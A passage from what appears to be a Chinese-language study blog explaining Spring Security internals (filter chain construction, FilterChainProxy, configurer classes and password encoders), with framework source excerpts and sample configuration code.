Provider方法配置执行认证的authenticationProvider对象，通过userDetailsService方法配置UserDetailsService，最后在beforeConfigure方法中触发AuthenticationManager对象的构建。</p></li><li><p>performBuild方法则是进行DefaultSecurityFilterChain对象的构建，传入请求匹配器和过滤器集合filters，在构建之前，会先按照既定的顺序对filters进行排序。</p></li><li><p>通过addFilterAfter、addFilterBefore两个方法，我们可以在某一个过滤器之后或者之前添加一个自定义的过滤器（该方法已在HttpSecurityBuilder中声明，此处是具体实现）。</p></li><li><p>addFilter方法可以向过滤器链中添加一个过滤器，这个过滤器必须是Spring Security框架提供的过滤器的一个实例或者其扩展。实际上，在每一个xxxConfigurer的configure方法中，都会调用addFilter方法将构建好的过滤器添加到HttpSecurity中的filters集合中（addFilter方法已在HttpSecurityBuilder中声明，此处是具体实现）。</p></li><li><p>addFilterAt方法可以在指定位置添加一个过滤器。需要注意的是，在同一个位置添加多个过滤器并不会覆盖现有的过滤器。</p></li></ul><h4 id="WebSecurity"><a href="#WebSecurity" class="headerlink" title="WebSecurity"></a>WebSecurity</h4><p>HttpSecurity是装配了DefaultSecurityFilterChain,但可能存在多个HttpSecurity也就是存在多个DefaultSecurityFilterChain,这个类的作用是将这些整合成一个FilterChainProxy对象</p><ul><li>变量ignoredRequests:保存了所有被忽略的请求</li><li>变量securityFilterChainBuilders:该集合用来保存所有的HttpSecurity对象</li><li>变量httpFirewall:用来配置请求防火墙</li><li>performBuild:该方法首先统计过滤总数,创建一个securityFilterChains,遍历被忽略的请求并分别构建成DefaultSecurityFilterChain对象保存到securityFilterChains集合中但是只有请求匹配器没有过滤链,这样就可以不用过滤直接放行了,然后securityFilterChain Builders集合，调用每个对象的build方法构建DefaultSecurityFilterChain并存入securityFilter Chains集合中，然后传入securityFilterChains集合构建FilterChainProxy对象，最后再设置HTTP防火墙。所有设置完成之后，最后返回filterChainProxy对象。</li></ul><h4 id="FilterChainProxy"><a href="#FilterChainProxy" class="headerlink" title="FilterChainProxy"></a>FilterChainProxy</h4><ul><li>变量filterChains:用来保存过滤链</li><li>变量filterChainValidator:过滤器配置链完成后的认证器</li><li>变量firewall:防火墙</li></ul><p>主要运行方法doFilter:</p><blockquote><p>首先该方法会先定义一个变量,检查是否为第一次执行是的话会在过滤链结束后清空SecurityContextHolder,这是防止没有配置SecurityContextPersistenceFilter,关键的过滤处理在doFilterInternal中</p></blockquote><p>doFilterInternal源码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>       <span class="hljs-type">FirewalledRequest</span> <span class="hljs-variable">firewallRequest</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.firewall.getFirewalledRequest((HttpServletRequest)request);<br>       <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">firewallResponse</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.firewall.getFirewalledResponse((HttpServletResponse)response);<br>       List&lt;Filter&gt; filters = <span class="hljs-built_in">this</span>.getFilters((HttpServletRequest)firewallRequest);<br>       <span class="hljs-keyword">if</span> (filters != <span class="hljs-literal">null</span> &amp;&amp; filters.size() != <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>               logger.debug(LogMessage.of(() -&gt; &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Securing &quot;</span> + requestLine(firewallRequest);<br>               &#125;));<br>           &#125;<br><br>           FilterChainProxy.<span class="hljs-type">VirtualFilterChain</span> <span class="hljs-variable">virtualFilterChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterChainProxy</span>.VirtualFilterChain(firewallRequest, chain, filters);<br>           virtualFilterChain.doFilter(firewallRequest, firewallResponse);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>               logger.trace(LogMessage.of(() -&gt; &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No security for &quot;</span> + requestLine(firewallRequest);<br>               &#125;));<br>           &#125;<br><br>           firewallRequest.reset();<br>           chain.doFilter(firewallRequest, firewallResponse);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>首先会通过防火墙类来创建firewallRequest和firewallResponse</p><p>再从getFilters中获取到适合的filters过滤链如果为空就跳回WebFilter(最外层过滤链,相当于过滤结束),否则就根据获得的过滤链进行变量,并且对每个链都创建一个virtualFilterChain然后继续过滤</p><p>再来看virtualFilterChain(部分源代码):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> FilterChain originalChain;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Filter&gt; additionalFilters;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> FirewalledRequest firewalledRequest;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> size;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> currentPosition;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.currentPosition == <span class="hljs-built_in">this</span>.size) &#123;<br>                <span class="hljs-keyword">if</span> (FilterChainProxy.logger.isDebugEnabled()) &#123;<br>                    FilterChainProxy.logger.debug(LogMessage.of(() -&gt; &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Secured &quot;</span> + FilterChainProxy.requestLine(<span class="hljs-built_in">this</span>.firewalledRequest);<br>                    &#125;));<br>                &#125;<br><br>                <span class="hljs-built_in">this</span>.firewalledRequest.reset();<br>                <span class="hljs-built_in">this</span>.originalChain.doFilter(request, response);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ++<span class="hljs-built_in">this</span>.currentPosition;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">nextFilter</span> <span class="hljs-operator">=</span> (Filter)<span class="hljs-built_in">this</span>.additionalFilters.get(<span class="hljs-built_in">this</span>.currentPosition - <span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">if</span> (FilterChainProxy.logger.isTraceEnabled()) &#123;<br>                    FilterChainProxy.logger.trace(LogMessage.format(<span class="hljs-string">&quot;Invoking %s (%d/%d)&quot;</span>, nextFilter.getClass().getSimpleName(), <span class="hljs-built_in">this</span>.currentPosition, <span class="hljs-built_in">this</span>.size));<br>                &#125;<br><br>                nextFilter.doFilter(request, response, <span class="hljs-built_in">this</span>);<br>            &#125;<br>        &#125;<br>     &#125;<br></code></pre></td></tr></table></figure><ul><li>变量originalChain:用来跳回WebFilter</li><li>变量additionalFilters:本次要进行过滤的过滤器链</li><li>变量firewalledRequest:用户请求</li><li>变量size:请求链大小</li><li>变量currentPosition:当前请求链位置</li></ul><p>在doFilter方法中，会首先判断当前执行的下标是否等于过滤器链的大小，如果相等，则说明整个过滤器链中的所有过滤器都已经挨个走一遍了，此时先对Http防火墙中的属性进行重置，然后调用originalChain.doFilter方法跳出Spring Security Filter，回到Web Filter；如果不相等，则currentPosition自增，然后从过滤器链集合中取出一个过滤器去执行，注意执行的时候第三个参数this表示当前对象（即VirtualFilterChain），这样在每一个过滤器执行完之后，最后的chain.doFilter方法又会回到当前doFilter方法中，继续下一个过滤器的调用。</p><h4 id="SecurityConfigurer"><a href="#SecurityConfigurer" class="headerlink" title="SecurityConfigurer"></a>SecurityConfigurer</h4><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211011200219902.png" alt="image-20211011200219902"></p><p>从名字上面看就大概知道该接口是用来初始化和配置类的配置</p><p>因为有很多的过滤器,而每个过滤器都有一个XXXconfigurer所以子类很多</p><p>下图为一小部分</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211011200608279.png" alt="image-20211011200608279"></p><p>首先我们来看最开始配置的,目前位置最熟悉的配置类的父类的兄弟类:dog:</p><h5 id="SecurityConfigurerAdapter"><a href="#SecurityConfigurerAdapter" class="headerlink" title="SecurityConfigurerAdapter"></a>SecurityConfigurerAdapter</h5><ul><li><p>为每个配置类都提供了一个SecurityBuilder,使用build创建对象使用and返回对象,这里就和前面的一样</p></li><li><p>定义了内部类CompositeObjectPostProcessor，这是一个复合的对象后置处理器</p></li><li><p>提供了一个addObjectPostProcessor方法，通过该方法可以向复合的对象后置处理器中添加新的ObjectPostProcessor实例</p></li></ul><h5 id="UserDetailsAwareConfigurer"><a href="#UserDetailsAwareConfigurer" class="headerlink" title="UserDetailsAwareConfigurer"></a>UserDetailsAwareConfigurer</h5><p>他的子类主要用于认证配置的相关组件,例如UserDetailsService,但是获取UserDetailsService的方法为抽象方法需要在子类中实现</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211012091022619.png" alt="image-20211012091022619"></p><ul><li>AbstractDaoAuthenticationConfigurer:完成对DaoAuthenticationProvider的配置</li><li>UserDetailsServiceConfigurer:完成对UserDetailsService的配置</li><li>UserDetailsManagerConfigurer:使用UserDetailsManager构建用户对象，完成对AuthenticationManagerBuilder的填充</li><li>JdbcUserDetailsManagerConfigurer:配置JdbcUserDetailsManager并填充到Authentication ManagerBuilder中</li><li>InMemoryUserDetailsManagerConfigurer:配置InMemoryUserDetailsManager</li><li>DaoAuthenticationConfigurer:完成对DaoAuthenticationProvider的配置</li></ul><h5 id="AbstractHttpConfigurer"><a href="#AbstractHttpConfigurer" class="headerlink" title="AbstractHttpConfigurer"></a>AbstractHttpConfigurer</h5><p>主要是为了给在HttpSecurity中使用的配置类添加一个方便的父类，提取出共同的操作</p><ul><li><p>disable表示禁用某一个配置（第2章中我们配置的.csrf().disable()），本质上就是从构建器的configurers集合中移除某一个配置类，这样在将来构建的时候就不存在该配置类，那么对应的功能也就不存在（被禁用）</p></li><li><p>withObjectPostProcessor表示给某一个对象添加一个对象后置处理器，由于该方法的返回值是当前对象，所以该方法可以用在链式配置中。</p></li></ul><p>下面是他的子类</p><p><img src="/.com//package_and_data\Book\JdReaderEBooks\jd_4657302ffcbc3\30712708_dir_img\OEBPS\Images\Figure-T138_115736.jpg" alt="Figure-T138_115736"></p><h5 id="GlobalAuthenticationConfigurerAdapter"><a href="#GlobalAuthenticationConfigurerAdapter" class="headerlink" title="GlobalAuthenticationConfigurerAdapter"></a>GlobalAuthenticationConfigurerAdapter</h5><p>用于配置全局AuthenticationManagerBuilder</p><p>在介绍ProviderManager时曾经提到过，默认情况下ProviderManager有一个parent，这个parent就是通过这里的全局AuthenticationManagerBuilder来构建的</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211012093313969.png" alt="image-20211012093313969"></p><p>他的继承关系为上图</p><ul><li>InitializeAuthenticationProviderBeanManagerConfigurer：初始化全局的AuthenticationProvider对象</li><li>InitializeAuthenticationProviderManagerConfigurer：配置全局的AuthenticationProvider对象，配置过程就是从Spring容器中查找AuthenticationProvider并设置给全局的AuthenticationManagerBuilder对象。</li><li>InitializeUserDetailsBeanManagerConfigurer：初始化全局的UserDetailsService对象。</li><li>InitializeUserDetailsManagerConfigurer：配置全局的UserDetailsService对象，配置过程就是从Spring容器中查找</li><li>UserDetailsService，并设置给全局的AuthenticationManagerBuilder对象。</li><li>EnableGlobalAuthenticationAutowiredConfigurer：从Spring容器中加载被@EnableGlobal Authentication注解标记的Bean。</li></ul><h5 id="WebSecurityConfigurer"><a href="#WebSecurityConfigurer" class="headerlink" title="WebSecurityConfigurer"></a>WebSecurityConfigurer</h5><p>空接口</p><h5 id="WebSecurityConfigurerAdapter"><a href="#WebSecurityConfigurerAdapter" class="headerlink" title="WebSecurityConfigurerAdapter"></a>WebSecurityConfigurerAdapter</h5><p>大多数情况下我们继承他来创建securityConfig</p><p>有两个AuthenticationManagerBuilder对象用来构建AuthenticationManager</p><ul><li>private AuthenticationManagerBuilder authenticationBuilder<ul><li>用于配置局部他和每个HttpSecurity进行绑定</li></ul></li><li>private AuthenticationManagerBuilder localConfigureAuthenticationBldr<ul><li>是所有局部AuthenticationManager的parent,但是如果没有重写configure(AuthenticationManagerBuilder)方法全局的AuthenticationManager对象是由AuthenticationConfiguration类中的getAuthenticationManager方法提供的，如果用户重写了configure(AuthenticationManagerBuilder)方法，则全局的AuthenticationManager就由localConfigureAuthenticationBldr负责构建</li></ul></li></ul><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><h5 id="ObjectPostProcessor"><a href="#ObjectPostProcessor" class="headerlink" title="ObjectPostProcessor"></a>ObjectPostProcessor</h5><p>所有过滤器创建后由ObjectPostProcessor来添加到Bean中一般调用过程为，ObjectPostProcessor的实例类CompositeObjectPostProcessor调用postProcess方法，而该方法会遍历该类所维护的ObjectPostProcessor对象的postProcess方法，也就是该类的实现类AutowireBeanFactoryObjectPostProcessor的postProcess方法，这个对象会将对象注入到Bean容器中</p><blockquote><p>也可以自己定义ObjectPostProcessor然后注入到CompositeObjectPostProcessor的List列表中这样在注册到Bean中还能个性化配置例如动态权限配置</p></blockquote><p>我们可以使用如下方法来配置ObjectPostProcessor</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211013152326388.png" alt="image-20211013152326388"></p><h5 id="多种定义"><a href="#多种定义" class="headerlink" title="多种定义"></a>多种定义</h5><ol><li><p>局部定义数据源</p><ul><li><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211013194636900.png" alt="image-20211013194636900"></li></ul></li><li><p>全局定义</p><ul><li>&#96;&#96;&#96;java<br>@Configuration<br>   public class SecurityConfig extends WebSecurityConfigurerAdapter {<br>  @Bean<br>  UserDetailsService us() {<br>      InMemoryUserDetailsManager users &#x3D; new InMemoryUserDetailsManager();<br>      users.createUser(User.withUsername(“江南一点雨”)<br>              .password(“{noop}123”).roles(“admin”).build());<br>      return users;<br>  }<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><br>     <br><br><span class="hljs-number">3.</span> 全局定义<span class="hljs-number">2</span><br><br>   - ```java<br>         <span class="hljs-meta">@Override</span><br>          <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>              auth.inMemoryAuthentication().withUser(<span class="hljs-string">&quot;javagirl&quot;</span>)<br>                      .password(<span class="hljs-string">&quot;&#123;noop&#125;123&quot;</span>)<br>                      .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>          &#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h5 id="配置多个过滤器"><a href="#配置多个过滤器" class="headerlink" title="配置多个过滤器"></a>配置多个过滤器</h5><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211014102143194.png" alt="image-20211014102143194"></p><p>注意了要配置多个相同的配置类要指定顺序,数字越大优先级越低。当请求到来时，会按照过滤器链的优先级从高往低，依次进行匹配。</p><h5 id="静态资源过滤"><a href="#静态资源过滤" class="headerlink" title="静态资源过滤"></a>静态资源过滤</h5><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211014102537560.png" alt="image-20211014102537560"></p><p>例如要过滤上面的资源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;   <br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(WebSecurity web)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        web.ignoring().antMatchers(<span class="hljs-string">&quot;/login.html&quot;</span>, <span class="hljs-string">&quot;/css/**&quot;</span>, <span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/images/**&quot;</span>);<br>        <span class="hljs-built_in">super</span>.configure(web);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="利用过滤器实现验证码认证-x3D-x3D-没理解-x3D-x3D"><a href="#利用过滤器实现验证码认证-x3D-x3D-没理解-x3D-x3D" class="headerlink" title="利用过滤器实现验证码认证&#x3D;&#x3D;没理解&#x3D;&#x3D;"></a>利用过滤器实现验证码认证&#x3D;&#x3D;没理解&#x3D;&#x3D;</h5><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211014152500985.png" alt="image-20211014152500985"></p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211014152627110.png" alt="image-20211014152627110"></p><h3 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h3><p>PasswordEncoder加密接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PasswordEncoder</span> &#123;<br>    String <span class="hljs-title function_">encode</span><span class="hljs-params">(CharSequence rawPassword)</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(CharSequence rawPassword, String encodedPassword)</span>;<br>    <span class="hljs-keyword">default</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">upgradeEncoding</span><span class="hljs-params">(String encodedPassword)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><ul><li>encode:进行加密</li><li>matches:密码比对</li><li>upgradeEncoding:加密升级</li></ul><h5 id="常见加密类"><a href="#常见加密类" class="headerlink" title="常见加密类"></a>常见加密类</h5><ul><li><p>BCryptPasswordEncoder自带盐降低运行速度</p></li><li><p>Argon2PasswordEncoder为了解决在定制硬件上密码容易被破解的问题</p></li><li><p>Pbkdf2PasswordEncoder:和前面几种类似，PBKDF2算法也是一种故意降低运算速度的算法，当需要FIPS（Federal Information Processing Standard，美国联邦信息处理标准）认证时，PBKDF2算法是一个很好的选择。</p></li><li><p>SCryptPasswordEncoder:也是一种故意降低运算速度的算法，而且需要大量内存</p></li></ul><p>这四种就是我们前面所说的自适应单向函数加密。除了这几种，还有一些基于消息摘要算法的加密方案，这些方案都已经不再安全，但是出于兼容性考虑，Spring Security并未移除相关类，主要有LdapShaPasswordEncoder、MessageDigestPasswordEncoder、Md4Password Encoder、StandardPasswordEncoder以及NoOpPasswordEncoder（密码明文存储），这五种皆已废弃，这里对这些类也不做过多介绍。</p><h5 id="DelegatingPasswordEncoder-现在系统默认的"><a href="#DelegatingPasswordEncoder-现在系统默认的" class="headerlink" title="DelegatingPasswordEncoder(现在系统默认的)"></a>DelegatingPasswordEncoder(现在系统默认的)</h5><p>该类是一个代理类使用代理类的好处有:</p><ul><li>兼容性:可以帮助很多旧密码加密的系统顺利迁移到spring security,允许同一系统出现多种加密方式</li><li>便捷性:由于加密方式肯能会改变使用代理类直接修改加密方案而不用大量修改</li><li>稳定性:作为一个框架，Spring Security不能经常进行重大更改，而使用Delegating PasswordEncoder可以方便地对密码进行升级(自动从一个加密方案升级到另外一个加密方案)。</li></ul><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211015151833725.png" alt="image-20211015151833725"></p><p>查看源码即可看出PREFIX为包含加密类型的前缀SUFFIX为包含加密类型的后缀</p><p>idForEncode为加密类型</p><p>passwordEncoderForEncode为当前加密类型</p><p>idToPasswordEncoder里面存放着字符串和加密类的映射</p><p>defaultPasswordEncoderForMatches存放着默认的密码匹配类,(默认调用该类会直接报错)</p><p>而&#x3D;&#x3D;DelegatingPasswordEncoder&#x3D;&#x3D;是由&#x3D;&#x3D;PasswordEncoderFactories&#x3D;&#x3D;类的静态方法&#x3D;&#x3D;createDelegatingPasswordEncoder&#x3D;&#x3D;提供的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordEncoderFactories</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">PasswordEncoderFactories</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PasswordEncoder <span class="hljs-title function_">createDelegatingPasswordEncoder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodingId</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bcrypt&quot;</span>;<br>        Map&lt;String, PasswordEncoder&gt; encoders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        encoders.put(encodingId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;ldap&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LdapShaPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;MD4&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Md4PasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;MD5&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;MD5&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;noop&quot;</span>, NoOpPasswordEncoder.getInstance());<br>        encoders.put(<span class="hljs-string">&quot;pbkdf2&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pbkdf2PasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;scrypt&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SCryptPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;SHA-1&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;SHA-1&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;SHA-256&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;SHA-256&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;argon2&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Argon2PasswordEncoder</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DelegatingPasswordEncoder</span>(encodingId, encoders);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过上面这个类可以看出我们可以自己定义类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    UserService userService;<br>    <span class="hljs-meta">@Bean</span><br>    PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodingId</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bcrypt&quot;</span>;<br>        Map&lt;String, PasswordEncoder&gt; encoders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        encoders.put(encodingId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>(<span class="hljs-number">31</span>));<br>        encoders.put(<span class="hljs-string">&quot;ldap&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LdapShaPasswordEncoder</span>());<br>       encoders.put(<span class="hljs-string">&quot;MD4&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Md4PasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;MD5&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;MD5&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;noop&quot;</span>, NoOpPasswordEncoder.getInstance());<br>        encoders.put(<span class="hljs-string">&quot;pbkdf2&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pbkdf2PasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;scrypt&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SCryptPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;SHA-1&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;SHA-1&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;SHA-256&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageDigestPasswordEncoder</span>(<span class="hljs-string">&quot;SHA-256&quot;</span>));<br>        encoders.put(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardPasswordEncoder</span>());<br>        encoders.put(<span class="hljs-string">&quot;argon2&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Argon2PasswordEncoder</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DelegatingPasswordEncoder</span>(encodingId, encoders);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>这样就可以自己定义升级BCryptPasswordEncoder(从10升级到31)</p><h5 id="实践一下"><a href="#实践一下" class="headerlink" title="实践一下"></a>实践一下</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 